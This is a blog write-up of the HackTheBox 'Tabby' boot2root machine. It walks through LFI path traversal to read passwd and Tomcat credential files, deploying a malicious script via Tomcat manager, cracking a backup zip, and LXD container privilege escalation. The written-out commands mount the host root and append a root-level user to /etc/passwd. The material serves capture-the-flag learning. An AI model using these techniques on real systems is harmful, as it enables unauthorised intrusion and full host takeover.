<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Write-up Tabby Machine | PCW3R</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Write-up Tabby Machine" /><meta name="author" content="ScarNGone & pcw3r" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ref°: HTB-17-Boot2Root" /><meta property="og:description" content="Ref°: HTB-17-Boot2Root" /><link rel="canonical" href="https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/" /><meta property="og:url" content="https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/" /><meta property="og:site_name" content="PCW3R" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-07T17:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Write-up Tabby Machine" /><meta name="twitter:site" content="@PCW3R" /><meta name="twitter:creator" content="@ScarNGone & pcw3r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"ScarNGone & pcw3r"},"description":"Ref°: HTB-17-Boot2Root","@type":"BlogPosting","url":"https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/","headline":"Write-up Tabby Machine","dateModified":"2020-11-07T17:00:00+01:00","datePublished":"2020-11-07T17:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div class="profile-text mt-3"><div class="site-title"> <a href="/">PCW3R</a></div><div class="site-subtitle font-italic">Think outside the box.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/PCW3R" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/PCW3R" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['pcw3r','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Write-up Tabby Machine</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Write-up Tabby Machine</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 7, 2020, 5:00 PM +0100"> {"long"=>"Nov 7, 2020", "short"=>"Nov 7"} <i class="unloaded">2020-11-07T17:00:00+01:00</i> </span> by <span class="author"> ScarNGone & pcw3r </span></div></div><div class="post-tail-wrapper-head"> <i class="fas fa-hourglass-half fa-fw mr-1"></i> <span class="reading-time" title="Estimated read time"> 4 mins read </span></div><div class="post-content"><p><strong><center>Ref°: HTB-17-Boot2Root</center></strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Badge-Tabby.png" alt="Desktop View" /></p><p>— Tabby is a vulnerable machine through LFI in tomcat service and the reuse of a password to get into the target.</p><p>Privesc is possible from container LXD exploitation.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Information-Tabby.png" alt="Desktop View" /></p><h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2><h3 id="network-service-scanning">Network Service Scanning</h3><hr /><p>We have the 4 following open ports : 22, 80, 8080 and 4446</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-nmap.png" alt="Desktop View" /></p><h3 id="website-on-port-80">Website on port 80</h3><hr /><p>We have website present on port 80.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-website.png" alt="Desktop View" /></p><p>THe main page reveal “We apologise to all our customers for the previous data breach. We have changed the site to remove this tool, and have invested heavily in more secure servers.”</p><p>Interesting page : <a href="http://megahosting.htb/news.php">http://megahosting.htb/news.php</a></p><h3 id="tomcat-service-on-port-8080">Tomcat service on port 8080</h3><hr /><p>Interesting paths who need authentication :</p><ul><li><a href="http://10.10.10.194:8080/host-manager/html">http://10.10.10.194:8080/host-manager/html</a></li><li><a href="http://10.10.10.194:8080/manager/html">http://10.10.10.194:8080/manager/html</a></li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-tomcat.png" alt="Desktop View" /></p><h2 id="2-weaponization---find-exploit-way"><strong><span style="color:#c0392b">[2] Weaponization - Find exploit way</span></strong></h2><h3 id="fuzzing-and-lfi-in-tomcat-service">Fuzzing and LFI in Tomcat service</h3><hr /><p>Reference : <a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></p><p>Tomcat is vulnerable to LFI attack. We using this technique to recover sensitive information.</p><p>Grab passwd file for example :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-LFI_passwd.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-information_users.png" alt="Desktop View" /></p><p>We know that Tomcat service has interesting information in its file “tomcat-users.xml” and the location seem to be in $CATALINA_HOME : <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/conf/tomcat-users.xml</code></p><p>Fuzzing method can help us to search the good location of this file.</p><p>Reference : <a href="https://wfuzz.readthedocs.io/en/latest/user/advanced.html">https://wfuzz.readthedocs.io/en/latest/user/advanced.html</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-fuzzing.png" alt="Desktop View" /></p><p>Result success on folder <code class="language-plaintext highlighter-rouge">etc</code> and get the file :</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">wget http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml
</span></pre></table></code></div></div><p>Plaintext password and rolename!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-rolename_tomcat.png" alt="Desktop View" /></p><p>The role rolename=”manager-script allows access to the text interface and the status pages only.</p><p>We have the possibility to connect now on host-manager but we can’t exploit anything.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-tomcat_host_manager.png" alt="Desktop View" /></p><h2 id="3-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[3] Foothold - Get into the target </span></strong></h2><h3 id="deploy-malicious-remote-script-on-tomcat-manager">Deploy malicious remote script on tomcat manager</h3><hr /><p>Reference : <a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script">https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-payload.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-deploy_remote_script_tomcat.png" alt="Desktop View" /></p><p>We launch this new script from URL : http://10.10.10.194/privuser45</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-get_revshell.png" alt="Desktop View" /></p><h2 id="4-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[4] Lateral Movement - Move through environment</span></strong></h2><h3 id="recover-archive-backup">Recover archive backup</h3><hr /><p>Archive file backup present under website folders. We recover it to try finding anything inside.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">wget http://10.10.10.194/files/16162020_backup.zip
</span></pre></table></code></div></div><h3 id="cracking-archive-password">Cracking archive password</h3><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-archive_password.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-crackzip.png" alt="Desktop View" /></p><h3 id="reusing-password-of-ash-user">Reusing password of ash user</h3><hr /><p>ash user reuse this password and we can connect on from “su” command.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-reuse_password.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-flag_user.png" alt="Desktop View" /></p><h2 id="5-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[5] Privilege Escalation - Gain higher-level permissions</span></strong></h2><h3 id="enumeration">Enumeration</h3><hr /><p>Many interesting information about lxd from linpeas enumeration.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-linpeas.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-linpeas_1.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-linpeas_2.png" alt="Desktop View" /></p><h3 id="container-lxd-exploitation">Container LXD Exploitation</h3><hr /><p>References :</p><ul><li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li><li><a href="https://www.exploit-db.com/exploits/46978">https://www.exploit-db.com/exploits/46978</a></li><li><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li></ul><p>The solution : mount root path in container with <code class="language-plaintext highlighter-rouge">lxd alpine builder</code></p><p>From offensive machine :</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
</span></pre></table></code></div></div><p>From victim machine :</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">wget 10.10.14.67:1337/alpine-v3.12-x86_64-20200906_1836.tar.gz
lxc image import alpine-v3.12-x86_64-20200906_1836.tar.gz --alias privuser45 &amp;&amp; lxd init --auto
lxc image list
lxc init privuser45 privesc -c security.privileged=true
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc sh
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-malicious_container.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-create_container.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-conf_container.png" alt="Desktop View" /></p><p>And we start our malicious container containing root path in <code class="language-plaintext highlighter-rouge">/mnt/root/root</code> .</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-privesc_container.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-flag_root.png" alt="Desktop View" /></p><h4 id="bruteforce-with-johntheripper-">Bruteforce with johntheripper :</h4><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">root:$</span>6<span class="nv">$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H</span>/:18429:0:99999:7:::
<span class="go">root:x:0:0:root:/root:/bin/bash
</span></pre></table></code></div></div><p>#### Add malicious user with root privilege : Reference : <a href="https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/">https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/</a></p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">perl -le 'print crypt("Password@973","addedsalt")'
</span><span class="gp">echo "privuser45:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" &gt;</span><span class="o">&gt;</span> /mnt/root/etc/passwd
<span class="go">
lxc delete privesc &amp;&amp; lxc image delete privuser45
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-malicious_user.png" alt="Desktop View" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/tabby/HTB-Images-Tabby-malicious_user_1.png" alt="Desktop View" /></p><hr /><h1 id="trophy"><strong><center>Trophy</center></strong></h1><blockquote><p><strong>If you can’t give me poetry, can’t you give me poetical science?</strong></p><p>Ada Lovelace</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/boot2root/'>Boot2Root</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >LINUX</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >EASY</a> <a href="/tags/fuzzing/" class="post-tag no-text-decoration" >FUZZING</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/payload/" class="post-tag no-text-decoration" >PAYLOAD</a> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >ENUMERATION</a> <a href="/tags/container/" class="post-tag no-text-decoration" >CONTAINER</a> <a href="/tags/password-cracking/" class="post-tag no-text-decoration" >PASSWORD CRACKING</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Write-up Tabby Machine - PCW3R&url=https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Write-up Tabby Machine - PCW3R&u=https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Write-up Tabby Machine - PCW3R&url=https://pcw3r.github.io/posts/HTB-17-Pentest-Tabby/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">WINDOWS</a> <a class="post-tag" href="/tags/linux/">LINUX</a> <a class="post-tag" href="/tags/web-exploitation/">WEB EXPLOITATION</a> <a class="post-tag" href="/tags/payload/">PAYLOAD</a> <a class="post-tag" href="/tags/password-cracking/">PASSWORD CRACKING</a> <a class="post-tag" href="/tags/medium/">MEDIUM</a> <a class="post-tag" href="/tags/database-exploitation/">DATABASE EXPLOITATION</a> <a class="post-tag" href="/tags/active-directory-exploitation/">ACTIVE DIRECTORY EXPLOITATION</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/sudo-exploitation/">SUDO EXPLOITATION</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-16-Pentest-Admirer/" class="btn btn-outline-primary"><p>Write-up Admirer Machine</p></a> <a href="/posts/HTB-18-Pentest-Doctor/" class="btn btn-outline-primary"><p>Write-up Doctor Machine</p></a></div><!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-16-Pentest-Admirer/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 26, 2020 <i class="unloaded">2020-09-26T11:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Admirer Machine</h3><div class="text-muted small"><p> Ref°: HTB-16-Boot2Root — Admirer is a vulnerable machine through web and database exploitation to gain foothold. Once on the victim machine, we escalate privilege through Sudo permission and Py...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-01-Pentest-Postman/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Feb 2, 2020 <i class="unloaded">2020-02-02T04:33:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Postman Machine</h3><div class="text-muted small"><p> Ref°: HTB-01-Boot2Root — Postman is a Linux machine that highlights the exploitation of the RCE on the Redis service to gain access and allow to enumerate to escalate our privileges through a fo...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-03-Pentest-Traverxec/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Apr 11, 2020 <i class="unloaded">2020-04-11T05:33:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Write-up Traverxec Machine</h3><div class="text-muted small"><p> Ref°: HTB-03-Boot2Root — Traverxec is a Linux machine that highlights the exploitation of CVE through nostromo version 1.9.6 to gain first level access. Then allow the enumeration to escalate ou...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/pcw3r">pcw3r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 